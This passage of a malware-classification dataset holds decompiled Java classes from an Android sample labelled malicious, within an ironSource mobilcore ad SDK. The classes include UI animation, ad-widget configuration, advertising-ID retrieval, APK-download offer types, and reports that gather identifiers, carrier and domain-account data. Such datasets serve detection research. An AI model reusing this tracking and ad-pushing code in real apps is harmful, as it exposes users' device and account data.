- this.c)) + this.c; this.k=Math.min(this.k,this.i); this.k=Math.max(this.k,this.h); if (this.j == this.d && this.k == this.e) { this.q=true; break; } break; case 2: float interpolation2=new BounceInterpolator().getInterpolation(currentAnimationTimeMillis * this.n); this.j=this.b + Math.round(this.o * interpolation2); this.k=Math.round(interpolation2 * this.p) + this.c; break; } }  else { this.j=this.d; this.k=this.e; this.q=true; } return true; } public final void a(int i,int i2,int i3,int i4,int i5){ this.a=0; this.q=false; this.m=i5; this.l=AnimationUtils.currentAnimationTimeMillis(); this.b=i; this.c=i2; this.d=i + i3; this.e=i2 + i4; this.o=i3; this.p=i4; this.n=1.0f / this.m; } public final void b(int i,int i2,int i3,int i4,int i5){ a(i,0,i3,0,1000); this.a=2; } private static float a(float f){ float exp; float f2=x * f; if (f2 < 1.0f) { exp=f2 - (1.0f - ((float)Math.exp(-f2))); }  else { exp=((1.0f - ((float)Math.exp(1.0f - f2))) * 0.63212055f) + 0.36787945f; } return exp * y; } public final void e(){ this.j=this.d; this.k=this.e; this.q=true; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0087as.code","public final class C0087as extends AbstractC0089au {   public C0087as(  Activity activity,  int i){     super(activity,i);   }   @Override public final void a(  boolean z){     a(this.A,0,z);   }   @Override public final void b(  boolean z){     a(0,0,z);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,new int[]{-16777216,0});     invalidate();   }   @Override protected final void onLayout(  boolean z,  int i,  int i2,  int i3,  int i4){     int i5=i3 - i;     int i6=i4 - i2;     int i7=(int)this.d;     this.y.layout(0,0,i5,this.A);     f(i7);     if (p) {       this.z.layout(0,0,i5,i6);     }  else {       this.z.layout(0,i7,i5,i6 + i7);     }   }   private void f(  int i){     if (this.n && this.A != 0) {       int i2=this.A;       float f=(i2 - i) / i2;       if (p) {         if (i > 0) {           this.y.setTranslationY((int)(i2 * (-f) * 0.25f));           return;         }  else {           this.y.setTranslationY(-i2);           return;         }       }       this.y.offsetTopAndBottom(((int)((i2 * (-f)) * 0.25f)) - this.y.getTop());       this.y.setVisibility(i == 0 ? 4 : 0);     }   }   @Override protected final void a(  Canvas canvas,  int i){     this.s.setBounds(0,i - this.t,getWidth(),i);     this.s.draw(canvas);   }   @Override protected final void b(  Canvas canvas,  int i){     this.q.setBounds(0,0,getWidth(),i);     this.q.setAlpha((int)((1.0f - (i / this.A)) * 185.0f));     this.q.draw(canvas);   }   @Override protected final void c(  Canvas canvas,  int i){     if (this.v != null && this.v.getParent() != null && this.w == 0) {       int i2=this.A;       int height=this.u.getHeight();       this.v.getDrawingRect(this.x);       offsetDescendantRectToMyCoords(this.v,this.x);       int width=this.u.getWidth();       int interpolation=i - ((int)((1.0f - a.getInterpolation(1.0f - (i / i2))) * height));       int width2=this.x.left + ((this.x.width() - width) / 2);       canvas.save();       canvas.clipRect(width2,interpolation,width + width2,i);       canvas.drawBitmap(this.u,width2,interpolation,(Paint)null);       canvas.restore();     }   }   @Override protected final void a(){     this.k.a(0,0,this.A / 3,0,1000);   }   @Override protected final void b(  int i){     if (p) {       this.z.setTranslationY(i);       f(i);       invalidate();     }  else {       this.z.offsetTopAndBottom(i - this.z.getTop());       f(i);       invalidate();     }   }   @Override protected final boolean a(  MotionEvent motionEvent){     return motionEvent.getY() > this.d;   }   @Override protected final boolean b(){     return (!this.C && this.g <= ((float)this.F)) || (this.C && this.g >= this.d);   }   @Override protected final boolean a(  float f){     return (!this.C && this.g <= ((float)this.F) && f > 0.0f) || (this.C && this.g >= this.d);   }   @Override protected final void b(  float f){     c(Math.min(Math.max(this.d + f,0.0f),this.A));   }   @Override protected final void b(  MotionEvent motionEvent){     int i=(int)this.d;     if (this.e) {       this.l.computeCurrentVelocity(1000,this.m);       int xVelocity=(int)this.l.getXVelocity();       this.i=motionEvent.getY();       a(this.l.getYVelocity() > 0.0f ? this.A : 0,xVelocity,true);       return;     }     if (this.C && motionEvent.getY() > i) {       b(true);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0088at.code","final class C0088at extends AbstractC0086ar {   C0088at(  Activity activity,  int i){     super(activity,i,EnumC0080al.TOP);   }   @Override public final void a(  int i){     this.s=new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,new int[]{-16777216,0});     invalidate();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0090av.code","public final class C0090av extends H {   private final int a;   public C0090av(  Context context,  C0091aw c0091aw){     super(context,c0091aw);     this.a=48;   }   @Override public final String a(){     return ""sliderHeader"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,true);   }   @Override protected final boolean f(){     return true;   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);     this.h.setPadding(this.d.h(),this.d.j(),this.d.h(),this.d.j());     this.h.setEnabled(false);   }   @Override public final void d(){     ViewGroup viewGroup=(ViewGroup)this.h;     this.s=new ImageView(this.c);     this.s.setId(j());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(B.a(this.c,48.0f),B.a(this.c,48.0f));     layoutParams.addRule(15);     layoutParams.rightMargin=B.a(this.c,9.0f);     this.s.setLayoutParams(layoutParams);     viewGroup.addView(this.s);     this.p=new TextView(this.c);     this.p.setBackgroundColor(0);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,this.s.getId());     layoutParams2.addRule(15);     this.p.setLayoutParams(layoutParams2);     this.p.setId(j());     this.p.setSingleLine();     this.p.setEllipsize(TextUtils.TruncateAt.END);     this.p.setTypeface(null,1);     this.p.setTextSize(2,18.0f);     viewGroup.addView(this.p);     this.d.a(true,this.d.b(),this.p);   }   @Override public final void e(){     throw new UnsupportedOperationException(""Method not decompiled: com.ironsource.mobilcore.C0090av.e():void"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0091aw.code","final class C0091aw {   private Context a;   private b b;   private b c;   private b d;   private b e;   private b f;   private int g;   private int h;   private int i;   private a j;   private a k;   private a l;   private a m;   private a n;   private a o;   private a p;   private a q;   private a r;   private a s;   private int t;   private int u;   public C0091aw(  Context context,  JSONObject jSONObject) throws JSONException {     this.a=context;     JSONObject optJSONObject=jSONObject.optJSONObject(""textColors"");     if (optJSONObject != null) {       this.b=new b(optJSONObject.optJSONObject(""titleText""));       this.c=new b(optJSONObject.optJSONObject(""itemText""));       this.d=new b(optJSONObject.optJSONObject(""textShadow""));       this.e=new b(optJSONObject.optJSONObject(""searchHintColor""));       this.f=new b(optJSONObject.optJSONObject(""searchInputColor""));     }     JSONObject optJSONObject2=jSONObject.optJSONObject(""colors"");     if (optJSONObject2 != null) {       String optString=optJSONObject2.optString(""miniSeparatorTopLineColor"","""");       String optString2=optJSONObject2.optString(""miniSeparatorBottomLineColor"","""");       String optString3=optJSONObject2.optString(""widgetButtonSeparatorColor"","""");       this.g=TextUtils.isEmpty(optString) ? 0 : Color.parseColor(optString);       this.h=TextUtils.isEmpty(optString2) ? 0 : Color.parseColor(optString2);       this.i=TextUtils.isEmpty(optString3) ? 0 : Color.parseColor(optString3);       if (this.i == 0) {         this.i=this.g;       }     }  else {       this.g=0;       this.h=0;       this.i=0;     }     JSONObject optJSONObject3=jSONObject.optJSONObject(""images"");     if (optJSONObject3 != null) {       this.j=new a(optJSONObject3.optJSONObject(""sliderHandle""));       this.k=new a(optJSONObject3.optJSONObject(""searchIcon""));     }     JSONObject optJSONObject4=jSONObject.optJSONObject(""backgrounds"");     if (optJSONObject4 != null) {       this.l=new a(optJSONObject4.optJSONObject(""sliderBG""));       this.m=new a(optJSONObject4.optJSONObject(""menuTitleBG""));       this.n=new a(optJSONObject4.optJSONObject(""widgetButtonBG""));       this.o=new a(optJSONObject4.optJSONObject(""badgeBG""));       this.p=new a(optJSONObject4.optJSONObject(""ironSourceWidgetsBG""));       this.q=new a(optJSONObject4.optJSONObject(""separatorWidgetsBG""));       this.r=new a(optJSONObject4.optJSONObject(""widgetPressedBG""));       this.s=new a(optJSONObject4.optJSONObject(""searchBG""));     }     JSONObject optJSONObject5=jSONObject.optJSONObject(""dimensions"");     if (optJSONObject5 != null) {       this.t=optJSONObject5.optInt(""separatorHeight"",5);       this.u=optJSONObject5.optInt(""miniSeparatorLineHeight"",2);     }  else {       this.t=5;       this.u=2;     }   }   public final b a(){     return this.b;   }   public final b b(){     return this.c;   }   public final int c(){     return this.e.a(true);   }   public final int d(){     return this.f.a(true);   }   public final int e(){     return this.i;   }   public final int f(){     return this.t;   }   public final int g(){     return this.u;   }   public final int h(){     return B.a(this.a,12.0f);   }   public final int i(){     return B.a(this.a,9.0f);   }   public final int j(){     return B.a(this.a,6.0f);   }   public final Drawable k(){     return this.j.a(this.a);   }   public final Drawable l(){     return this.k.a(this.a);   }   public final Drawable m(){     return this.l.a(this.a);   }   public final Drawable n(){     return this.m.a(this.a);   }   public final Drawable o(){     return this.n.a(this.a);   }   public final Drawable p(){     return this.o.a(this.a);   }   public final Drawable q(){     return this.p.a(this.a);   }   public final Drawable r(){     return this.q.a(this.a);   }   public final Drawable s(){     return this.r.a(this.a);   }   public final Drawable t(){     return this.s.a(this.a);   }   public final void a(  boolean z,  b bVar,  TextView... textViewArr){     for (    TextView textView : textViewArr) {       if (textView != null) {         if (bVar != null) {           textView.setTextColor(bVar.a(z));         }         if (this.d != null) {           textView.setShadowLayer(2.0f,1.0f,1.0f,this.d.a(z));         }       }     }   }   public final void a(  ViewGroup viewGroup){     if (this.g != 0) {       View view=new View(this.a);       view.setLayoutParams(new LinearLayout.LayoutParams(-1,B.a(this.a,this.u)));       view.setBackgroundColor(this.g);       viewGroup.addView(view);     }     if (this.h != 0) {       View view2=new View(this.a);       view2.setLayoutParams(new LinearLayout.LayoutParams(-1,B.a(this.a,this.u)));       view2.setBackgroundColor(this.h);       viewGroup.addView(view2);     }   } public static class b {     private int a;     private int b;     public b(    JSONObject jSONObject){       if (jSONObject != null) {         this.a=Color.parseColor(jSONObject.optString(JSController.STYLE_NORMAL,""""));         String optString=jSONObject.optString(""pressed"","""");         if (TextUtils.isEmpty(optString)) {           this.b=this.a;         }  else {           this.b=Color.parseColor(optString);         }       }     }     public final int a(    boolean z){       return z ? this.a : this.b;     }   } private static class a {     private String a;     private String b;     public a(    JSONObject jSONObject){       if (jSONObject != null) {         this.a=jSONObject.optString(AnalyticsSQLiteHelper.EVENT_LIST_TYPE,"""");         this.b=jSONObject.optString(""value"","""");       }     }     public final Drawable a(    Context context){       if (TextUtils.isEmpty(this.b)) {         return null;       }       if (this.a.equals(AdView.BANNER_TYPE_IMAGE)) {         return new BitmapDrawable(context.getResources(),B.a(context,this.b));       }       if (this.a.equals(""tile"")) {         String str=this.b;         if (TextUtils.isEmpty(str)) {           return null;         }         BitmapDrawable bitmapDrawable=new BitmapDrawable(context.getResources(),B.a(context,str));         bitmapDrawable.setTileModeX(Shader.TileMode.REPEAT);         bitmapDrawable.setTileModeY(Shader.TileMode.REPEAT);         return bitmapDrawable;       }       if (this.a.equals(""9patch"")) {         Bitmap a=B.a(this.b);         byte[] ninePatchChunk=a.getNinePatchChunk();         if (!NinePatch.isNinePatchChunk(ninePatchChunk)) {           return null;         }         B.b a2=B.b.a(ninePatchChunk);         System.gc();         if (ninePatchChunk != null) {           return new NinePatchDrawable(a,ninePatchChunk,a2.a,null);         }         return null;       }       if (this.a.equals(""color"")) {         return new ColorDrawable(Color.parseColor(this.b));       }       return null;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0092ax.code","final class C0092ax extends F {   private String a;   private String b;   private String t;   private String u;   private String v;   public C0092ax(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceSocialWidgetFacebookWallPost"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=jSONObject.optString(""facebookAppId"","""");     this.b=jSONObject.optString(""facebookRedirectURI"","""");     this.t=jSONObject.optString(""appPictureUrl"","""");     this.u=jSONObject.optString(""appName"","""");     this.v=jSONObject.optString(""postText"","""");     super.a(jSONObject);   }   @Override public final void a(  View view){     try {       aE.a(this.e,MessageFormat.format(""https://m.facebook.com/dialog/feed?app_id={0}&link={1}&picture={2}&name={3}&description={4}&redirect_uri={5}"",aE.e(this.a),aE.e(aE.j(this.c)),aE.e(this.t),aE.e(this.u),aE.e(this.v),aE.e(this.b)),true);     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();     }     super.a(view);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0094c.code","public final class C0094c { public interface a {     void a();     void a(    String str,    boolean z);   }   public static void a(  final Context context,  final a aVar){     if (aVar != null) {       try {         if (Looper.myLooper() == Looper.getMainLooper()) {           aE.a(new AsyncTask<Void,Void,C0099h.a>(){             @Override protected final C0099h.a doInBackground(            Void[] voidArr){               return C0094c.b(context);             }             @Override protected final void onPostExecute(            C0099h.a aVar2){               C0094c.b(aVar2,aVar);             }           } );         }  else {           b(b(context),aVar);         }       }  catch (      Exception e) {         aVar.a();       }     }   }   public static C0099h.a b(  Context context){     try {       return C0099h.a(context);     }  catch (    C0095d e) {       return null;     } catch (    C0096e e2) {       e2.printStackTrace();       return null;     } catch (    IOException e3) {       return null;     } catch (    IllegalStateException e4) {       e4.printStackTrace();       return null;     } catch (    Exception e5) {       return null;     }   }   public static void b(  C0099h.a aVar,  a aVar2){     if (aVar != null) {       aVar2.a(aVar.a(),aVar.b());     }  else {       aVar2.a();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0095d.code","final class C0095d extends Exception {   private static final long serialVersionUID=1;   public final int a=9;   public C0095d(  int i){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0096e.code","final class C0096e extends C0098g {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0098g.code","class C0098g extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0099h.code","final class C0099h {   private static ServiceConnectionC0097f b(  Context context) throws IOException, C0095d, C0096e {     try {       context.getPackageManager().getPackageInfo(""com.android.vending"",0);       ServiceConnectionC0097f serviceConnectionC0097f=new ServiceConnectionC0097f();       Intent intent=new Intent(""com.google.android.gms.ads.identifier.service.START"");       intent.setPackage(""com.google.android.gms"");       if (context.bindService(intent,serviceConnectionC0097f,1)) {         return serviceConnectionC0097f;       }       throw new IOException(""Connection failure"");     }  catch (    PackageManager.NameNotFoundException e) {       throw new C0095d(9);     }   }   public static a a(  Context context) throws IOException, IllegalStateException, C0095d, C0096e {     ServiceConnectionC0097f b=b(context);     try {       try {         InterfaceC0093b a2=InterfaceC0093b.a.a(b.a());         return new a(a2.a(),a2.a(true));       }  catch (      RemoteException e) {         Log.i(""AdvertisingIdClient"",""GMS remote exception "",e);         throw new IOException(""Remote exception"");       } catch (      InterruptedException e2) {         throw new IOException(""Interrupted exception"");       }     }   finally {       context.unbindService(b);     }   } public static final class a {     private final String a;     private final boolean b;     a(    String str,    boolean z){       this.a=str;       this.b=z;     }     public final String a(){       return this.a;     }     public final boolean b(){       return this.b;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0100i.code","public final class C0100i {   private Context a=MobileCore.c();   private aW b=new aW(this.a);   private aW c=new aW(this.a);   private String d;   public C0100i(  String str,  aW.c cVar,  aW.c cVar2){     this.d=str;     cVar.setWebViewWithLoadState(this.b);     this.b.a(cVar);     cVar2.setWebViewWithLoadState(this.c);     this.c.a(cVar2);     WebViewClient webViewClient=new WebViewClient(){       @Override public final void onReceivedError(      WebView webView,      int i,      String str2,      String str3){         ((aW)webView).d();         A.a(""AlwaysLoadedWebViewHolder: webview "" + ((aW)webView).getId() + "" onReceivedError errorCode:""+ i+ "" , description:""+ str2+ "" , failingUrl:""+ str3,55);       }     } ;     this.b.setWebViewClient(webViewClient);     this.c.setWebViewClient(webViewClient);     this.c.a(str);     A.a(""AlwaysLoadedWebViewHolder: loading in mLoadedWebView:"" + this.c.getId() + "" , url: ""+ str,55);   }   public final void a(  String str){     A.a(""AlwaysLoadedWebViewHolder: reset. loading in mLoadedWebView:"" + this.c.getId() + "" , url: ""+ str,55);     this.b.clearCache(true);     this.b.c();     this.c.c();     this.c.a(str);   }   public final boolean b(  String str){     A.a(""AlwaysLoadedWebViewHolder: loadUrl. new mLoadWebView:"" + this.b.getId() + "" , url: ""+ str,55);     return this.b.a(str);   }   public final aW a(){     A.a(""AlwaysLoadedWebViewHolder: getReadyWebView. new mLoadWebView:"" + this.b.getId() + "" , isReady: ""+ this.b.a(),55);     if (this.b.a()) {       aW aWVar=this.b;       this.b=this.c;       this.c=aWVar;       A.a(""AlwaysLoadedWebViewHolder: swapping webviews. new mLoadWebView:"" + this.b.getId() + "" , new mLoadedWebView:""+ this.c.getId(),55);     }  else     if (this.c.b()) {       this.c.loadUrl(this.d);       return null;     }     return this.c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0101j.code","public class C0101j {   private static AnimationDrawable a;   private static Dialog b;   C0101j(){   }   static boolean c(){     List<File> a2=a(new File(MobileCore.c().getFilesDir().getPath() + ""/preloader/""));     return (a2 == null || a2.size() == 0) ? false : true;   }   static void d() throws Exception {     AnimationDrawable a2=a(MobileCore.c().getFilesDir().getPath() + ""/preloader/"",10);     a=a2;     a2.setOneShot(false);   }   public static void a(  boolean z){     if (a != null) {       if (z) {         a.start();       }  else {         a.stop();       }     }   }   public static void a(){     new Thread(new Runnable(){       @Override public final void run(){         if (C0101j.b(""preloader.zip"") || C0101j.c()) {           try {             C0101j.d();           }  catch (          Exception e) {             aE.a(MobileCore.c(),getClass().getName(),e);           }         }       }     } ).start();   }   public static int a(  AnimationDrawable animationDrawable){     if (animationDrawable == null) {       return 0;     }     int i=0;     for (int i2=0; i2 < animationDrawable.getNumberOfFrames(); i2++) {       i+=animationDrawable.getDuration(i2);     }     return i;   }   public static void b(  AnimationDrawable animationDrawable){     if (animationDrawable != null && Build.VERSION.SDK_INT < 11) {       int i=0;       while (true) {         int i2=i;         if (i2 < animationDrawable.getNumberOfFrames()) {           Drawable frame=animationDrawable.getFrame(i2);           if (frame instanceof BitmapDrawable) {             ((BitmapDrawable)frame).getBitmap().recycle();           }           i=i2 + 1;         }  else {           return;         }       }     }   }   public static AnimationDrawable a(  String str,  int i) throws Exception {     BitmapFactory.Options options;     Bitmap bitmap=null;     List<File> a2=a(new File(str));     if (a2 == null) {       throw new Exception(""No Files"");     }     AnimationDrawable animationDrawable=new AnimationDrawable();     if (Build.VERSION.SDK_INT >= 11) {       options=new BitmapFactory.Options();       options.inJustDecodeBounds=true;       BitmapFactory.decodeFile(a2.get(0).getAbsolutePath(),options);       bitmap=Bitmap.createBitmap(options.outWidth,options.outHeight,Bitmap.Config.ARGB_8888);       options.inJustDecodeBounds=false;       options.inBitmap=bitmap;       options.inSampleSize=1;     }  else {       options=null;     }     Iterator<File> it=a2.iterator();     while (true) {       Bitmap bitmap2=bitmap;       if (it.hasNext()) {         File next=it.next();         if (Build.VERSION.SDK_INT >= 11) {           BitmapFactory.decodeFile(next.getPath(),options);           bitmap=bitmap2;         }  else {           bitmap=BitmapFactory.decodeFile(next.getPath());         }         animationDrawable.addFrame(new BitmapDrawable(MobileCore.c().getResources(),B.a(MobileCore.c(),bitmap)),1000 / i);       }  else {         return animationDrawable;       }     }   }   public static boolean b(  String str){     try {       InputStream resourceAsStream=MobileCore.class.getResourceAsStream(""fallback/"" + str);       File file=new File(MobileCore.c().getFilesDir().getPath() + ""/"",str);       FileOutputStream fileOutputStream=new FileOutputStream(file);       byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];       while (true) {         int read=resourceAsStream.read(bArr);         if (read != -1) {           fileOutputStream.write(bArr,0,read);         }  else {           fileOutputStream.flush();           fileOutputStream.close();           resourceAsStream.close();           return aX.a(MobileCore.c().getFilesDir().getPath() + ""/"",file);         }       }     }  catch (    Exception e) {       aE.a(MobileCore.c(),C0101j.class.getName(),e);       return false;     }   }   private static List<File> a(  File file){     ArrayList arrayList=new ArrayList();     File[] listFiles=file.listFiles();     if (listFiles == null || listFiles.length <= 0) {       b(""preloader.zip"");       return null;     }     Arrays.sort(listFiles,new Comparator<File>(){       @Override public final int compare(      File file2,      File file3){         return file2.getName().compareTo(file3.getName());       }     } );     for (    File file2 : listFiles) {       if (file2.isDirectory()) {         arrayList.addAll(a(file2));       }  else {         arrayList.add(file2);       }     }     return arrayList;   }   public static void a(  Activity activity){     if (b == null) {       RelativeLayout relativeLayout=new RelativeLayout(activity);       ImageView imageView=new ImageView(activity);       RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);       layoutParams.addRule(13);       imageView.setLayoutParams(layoutParams);       AnimationDrawable animationDrawable=a;       if (animationDrawable != null) {         B.a((View)imageView,(Drawable)animationDrawable);         imageView.post(new Runnable(){           @Override public final void run(){             C0101j.a(true);           }         } );       }       relativeLayout.setLayoutParams(new ViewGroup.LayoutParams(-1,-1));       relativeLayout.setBackgroundColor(805306368);       relativeLayout.setFocusable(true);       relativeLayout.setClickable(true);       relativeLayout.addView(imageView);       imageView.bringToFront();       Dialog dialog=new Dialog(activity,android.R.style.Theme.Dialog);       b=dialog;       dialog.getWindow().requestFeature(1);       b.getWindow().setBackgroundDrawableResource(android.R.color.transparent);       b.setContentView(relativeLayout);       Dialog dialog2=b;       Window window=activity.getWindow();       WindowManager.LayoutParams attributes=window.getAttributes();       WindowManager.LayoutParams attributes2=dialog2.getWindow().getAttributes();       if (Build.VERSION.SDK_INT >= 11) {         attributes2.systemUiVisibility=attributes.systemUiVisibility;         if (window.hasFeature(1)) {           int i=Build.VERSION.SDK_INT;           attributes2.systemUiVisibility=1;         }         if ((activity.getWindow().getAttributes().flags & android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT) == 1024) {           attributes2.flags|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;         }       }  else       if ((window.getAttributes().flags & android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT) == 1024) {         attributes2.flags|=android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT;       }       attributes2.width=-1;       attributes2.height=-1;       b.getWindow().setAttributes(attributes2);     }     try {       b.show();     }  catch (    Exception e) {     }   }   public static void b(){     try {       if (b != null && b.isShowing()) {         b.dismiss();         a(false);         b=null;       }     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0102k.code","!org.eclipse.jdt.core.dom.TypeDeclaration@13f361dd"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0104m.code","class C0104m {   protected String a;   protected String b;   protected String c;   protected String d;   protected String e;   protected String f;   protected String g;   protected String h;   protected String i;   protected String j;   protected String k;   protected JSONArray l=null;   protected String m;   protected String n;   protected String o;   protected String p;   protected String q;   protected String r;   protected String s;   protected String t;   protected JSONObject u;   protected String v;   protected JSONArray w;   public HashMap<String,String> a(  HashMap<String,String> hashMap){     HashMap<String,String> a=a(a(a(a(a(a(a(a(a(a(a(a(a(a(a(a(a(a(a(a(hashMap,""Carrier"",this.c),""BV"",this.v),""Flow"",this.e),""Target"",this.j),""Step"",this.k),""UID"",this.d),""RS"",this.f),""Err"",this.g),""IRVER"",this.h),""TK"",this.i),""FirstRun"",this.a),""RV"",this.b),""FlowName"",this.m),""Platform"",this.n),""Orientation"",this.s),""curConnection"",this.r),""Offline"",this.p),""CarrierVer"",this.o),""Timer"",this.q),""DomainAccounts"",this.t);     if (this.u != null) {       a=a(a,this.u);     }     if (this.w != null) {       return a(a,this.w);     }     return a;   }   private HashMap<String,String> a(  HashMap<String,String> hashMap,  JSONArray jSONArray){     for (int i=0; i < jSONArray.length(); i++) {       try {         hashMap=a(hashMap,jSONArray.getJSONObject(i));       }  catch (      JSONException e) {         e.printStackTrace();       }     }     return hashMap;   }   private static HashMap<String,String> a(  HashMap<String,String> hashMap,  JSONObject jSONObject){     JSONArray names=jSONObject.names();     int i=0;     while (true) {       int i2=i;       if (i2 < names.length()) {         try {           String str=(String)names.get(i2);           Object obj=jSONObject.get(str);           hashMap.put(str,String.valueOf(obj));           A.a(""BaseReport | Adding "" + str + "":""+ obj,55);         }  catch (        JSONException e) {           e.printStackTrace();         }         i=i2 + 1;       }  else {         return hashMap;       }     }   }   public final void a(  JSONArray jSONArray){     this.w=jSONArray;   }   public final void a(  JSONObject jSONObject){     this.u=jSONObject;   }   public static HashMap<String,String> a(  HashMap<String,String> hashMap,  String str,  String str2){     if (str2 != null) {       hashMap.put(str,str2);     }     return hashMap;   }   public JSONObject a(){     JSONObject jSONObject=new JSONObject(a(new HashMap<>()));     if (this.l != null) {       try {         jSONObject.put(""Offers"",this.l);       }  catch (      JSONException e) {         e.printStackTrace();       }     }     return jSONObject;   }   public final void a(  int i){     this.v=String.valueOf(i);   }   public final void b(  int i){     if (i == 2) {       this.s=""landscape"";     }  else     if (i == 1) {       this.s=""portrait"";     }  else {       this.s=""undefined"";     }   }   public final void b(  JSONObject jSONObject){     if (this.l == null) {       this.l=new JSONArray();     }     this.l.put(jSONObject);   }   public final void b(  JSONArray jSONArray){     this.l=jSONArray;   }   public final void a(  String str){     this.r=str;   }   public final void b(  String str){     this.c=str;   }   public final void c(  String str){     this.o=str;   }   public final void d(  String str){     this.d=str;   }   public final void e(  String str){     this.e=str;   }   public final void f(  String str){     this.f=str;   }   public final void g(  String str){     this.g=str;   }   public final void h(  String str){     this.h=str;   }   public final void i(  String str){     this.i=str;   }   public final void a(  boolean z){     this.a=String.valueOf(z);   }   public final void j(  String str){     this.b=str;   }   public final void k(  String str){     this.m=str;   }   public final void l(  String str){     this.n=str;   }   public final void b(  boolean z){     this.p=""true"";   }   public final void m(  String str){     this.q=str;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0105n.code","final class C0105n {   public enum a {  OFFER_TYPE_MARKET(""Market""),   OFFER_TYPE_APK_DOWNLOAD(""ApkDownload""),   OFFER_TYPE_CPC(""CPC"");   private String d;   a(  String str){     this.d=str;   }   public static a a(  String str){     if (str == null) {       throw new IllegalArgumentException();     }     for (    a aVar : values()) {       if (str.equalsIgnoreCase(aVar.d)) {         return aVar;       }     }     throw new IllegalArgumentException();   } } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0106o.code","final class C0106o extends aI {   public static boolean a=false; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\C0107p.code","public class C0107p extends AbstractC0103l {   private static C0107p e;   private a f;   private Activity g;   private JSONObject h;   private JSONArray i;   private SparseArray<Boolean> j;   private OnReadyListener k;   public enum a {  STATE_INIT,   STATE_READY,   STATE_ERROR}   static OnReadyListener a(  C0107p c0107p,  OnReadyListener onReadyListener){     c0107p.k=null;     return null;   }   static void e(  C0107p c0107p){     MobileCore.b().post(new Runnable(){       @Override public final void run(){         if (C0107p.this.k != null) {           C0107p.this.k.onReady(MobileCore.AD_UNITS.DIRECT_TO_MARKET);           C0107p.a(C0107p.this,(OnReadyListener)null);         }       }     } );   }   static void h(  C0107p c0107p){     int i=0;     while (true) {       int i2=i;       if (i2 >= c0107p.i.length()) {         c0107p.g();         return;       }       Boolean bool=c0107p.j.get(i2);       if (bool == null || !bool.booleanValue()) {         return;       }  else {         i=i2 + 1;       }     }   }   @Override public final void c(){     super.c();   }   public enum b implements AbstractC0103l.c {  INIT(""init""),   SHOW(""show"");   private String c;   b(  String str){     this.c=str;   }   @Override public final String a(){     return this.c;   } }   @Override protected final boolean a(){     return this.f == null;   }   @Override protected final AbstractC0103l.a b(){     return new AbstractC0103l.a(""directToMarket"",""direct"",""direct-feed"",b.INIT,new c());   }   @Override public final void d(){     super.d();     a(a.STATE_INIT);     a(""DirectToMarket"",""initMembers"");     this.h=C0114w.a().b(""direct-feed"");     this.j=new SparseArray<>();   }   @Override protected final void e(){     b(""handleFlowDownloadError"",""Unspecified error."");     a(a.STATE_ERROR);   }   public static C0107p h(){     if (e == null) {       e=new C0107p();     }     return e;   }   public final synchronized void a(  OnReadyListener onReadyListener){     this.k=onReadyListener;   }   public final boolean i(){     return this.f == a.STATE_READY;   }   public final void a(  Activity activity){     if (this.f != 